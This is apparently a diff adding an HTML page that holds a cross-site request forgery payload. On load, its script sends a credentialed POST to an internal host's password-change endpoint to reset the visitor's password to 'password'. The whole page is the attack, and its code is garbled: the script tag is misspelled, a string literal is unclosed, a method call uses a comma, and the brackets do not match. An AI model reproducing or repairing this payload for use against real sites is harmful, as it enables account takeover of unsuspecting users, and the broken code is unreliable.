@@ -1,0 +1,26 @@
+<html>
+<head>
+<scritp>
+ var password = "password";
+ var host = "https://192.168.52.59:8443";
+ var admin_url = /api/me/password";
+ var admin_params = "password=" + password;
+
+function send_admin() {
+ fetch(host+admin_url, {
+ method: 'POST',
+ mode: 'cors',
+ credentials: 'include',
+ headers: {
+ 'Content-Type': 'application/x-www-form-urlencoded'
+ },
+  body : admin_params }
+ ),then(
+  console.log("Should be done..")
+ };
+}
+send_admin();
+</script>
+</head>
+<body></body>
+</html>
